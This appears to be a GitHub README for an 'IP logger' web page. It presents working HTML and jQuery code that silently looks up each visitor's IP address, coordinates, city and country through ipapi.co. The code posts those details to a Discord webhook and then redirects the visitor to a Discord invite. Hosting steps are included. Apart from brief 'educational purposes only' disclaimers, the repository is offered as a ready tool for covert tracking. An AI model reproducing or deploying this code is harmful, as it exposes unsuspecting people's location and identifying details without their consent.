---

# IP Logger Redirect Script

This repository contains a script designed to log IP addresses and other information about users who visit a particular web page, and then redirects them to a Discord server.

## How It Works

1. **HTML Structure**: The HTML page displays a simple "HELLO" message and includes jQuery.
2. **JavaScript Execution**:
   - The script uses `ipapi.co` to get the visitor's IP address and other details.
   - This information is then sent to a Discord webhook.
   - Finally, the user is redirected to a specified Discord server.

## Code Explanation

### HTML Structure

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting...</title>
    <meta charset="utf-8" />
    <h1><center>Star the repo please</center></h1>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" charset="utf-8"></script>
  </head>
  <body>
    <script type="text/javascript">
      // JavaScript code here
    </script>
  </body>
</html>
```

### JavaScript

```javascript
var WEBURL = "Webhook link here";

$.getJSON("https://ipapi.co/json/", function (data) {  //Visit https://ipapi.co for more commands
   $.post(WEBURL, {
        content:
          "Ip : " +
          data.ip +
          "Latitude : " +
          data.latitude +
          "Longitude : " +
          data.longitude +
          "\nCity : " +
          data.city +
          "\nCountry : " +
          data.country_name +
          "\nTimeZone : " +
          data.timezone +
          "\nCurrency : " +
          data.currency_name +
          "\nLanguages : " +
          data.languages +
          "\nNumber-Code : " +
          data.country_calling_code +
          "\n@here",

        username: "M7's Logger",
        avatar_url: null,
      });
});

window.location.href = "Invite link or other links here";
```

## Ethical Considerations

Please be aware that logging personal information without the user's consent is unethical and potentially illegal. This script collects and sends sensitive information such as IP address, location, and other details to a third party. Use this script responsibly and ensure compliance with privacy laws and regulations.

## Warning

This script is intended for **educational purposes only**. Misuse of this code to collect personal information without consent is prohibited. Always respect user privacy and obtain proper consent before collecting any personal information.

## Documentation for IP Address Location API

[ipapi.co](https://ipapi.co) provides a REST API to find the location of an IP address.

Specifically, you can get the following information for any IP address:
- City
- Region (name & code)
- Country (name & code)
- Continent
- Postal code / zip code
- Latitude
- Longitude
- Timezone
- UTC offset
- European Union (EU) membership
- Country calling code
- Country capital
- Country TLD (top-level domain)
- Currency (name & code)
- Area & population of the country
- Languages spoken
- ASN
- Organization
- Hostname*

* Hostname is an optional add-on, currently in beta. Please contact us to learn more about it or to enable it for your account.

The API can also help you to find the public IP address of a device.

The API can be integrated into your application either on the server side or on the client side. The documentation below uses JSON format as an example. Other supported formats are XML, CSV, YAML, and JSONP.

Both IPv4 & IPv6 type addresses are supported.

Please refer to the right pane for examples in Ruby, Python, PHP, Javascript, Node.js, jQuery, Java, C#, and Go. If your language of choice isn’t listed here, it doesn’t mean that the API can’t handle it, as long as you can send an HTTP web request and consume the response. Please contact us for any support requests.

## Usage

To use this script, host the HTML file on a web server. When users visit the page, their information will be logged and they will be redirected to the specified Discord server.

## Disclaimer

This script is for educational purposes only. The author is not responsible for any misuse of the code. Always respect user privacy and obtain proper consent before collecting any personal information.

---

### Example Usage:

1. Clone the repository:

   ```sh
   git clone https://github.com/yourusername/ip-logger-redirect.git
   ```

2. Host the HTML file on your preferred web server.

3. Update the `WEBURL` variable in the JavaScript code with your Discord webhook URL.

4. Access the hosted HTML page. The script will log user information and redirect them.

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

